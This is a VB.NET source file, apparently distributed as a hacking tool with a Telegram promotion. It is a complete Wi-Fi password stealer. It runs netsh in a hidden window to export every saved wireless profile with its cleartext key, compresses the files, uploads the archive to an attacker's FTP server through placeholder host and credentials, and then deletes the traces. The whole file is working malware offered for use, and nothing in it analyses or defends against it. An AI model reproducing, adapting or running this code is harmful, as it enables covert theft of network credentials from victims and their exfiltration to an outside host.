Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Net.Mail

'// This project was created by CTOSLAB
'// Join our telegram group to get more hacking tools
'// https://t.me/ctoslab

Module Module1
    Sub Main()
        ' Creating folder
        Dim tmp As String = Path.GetTempPath()
        Dim root As String = tmp + "\wsteal\"

        ' If the folder does not exist, so create one
        If Not Directory.Exists(root) Then
            Directory.CreateDirectory(root)
        End If

        ' Run command to export all saved wifi
        Threading.Thread.Sleep(3000)
        Dim wsteal As String = "netsh wlan export profile folder=%tmp%\wsteal\ key=clear && cd %tmp%\wsteal\ && powershell Compress-Archive *.xml pwn3d.zip"
        Shell("cmd.exe /c" + wsteal, AppWinStyle.Hide)

        ' Upload file to ftp
        Threading.Thread.Sleep(10000)
        Dim client As WebClient = New WebClient
        client.Credentials = New NetworkCredential("YOURFTPUSERNAME", "YOURFTPPASSWORD")
        client.UploadFile("ftp://YOURFTPHOST/public_html/pwn3d.zip", tmp + "\wsteal\pwn3d.zip")

        ' Delete All
        Dim workpath As String = tmp + "\wsteal\"
        System.IO.Directory.Delete(workpath, True)

    End Sub
End Module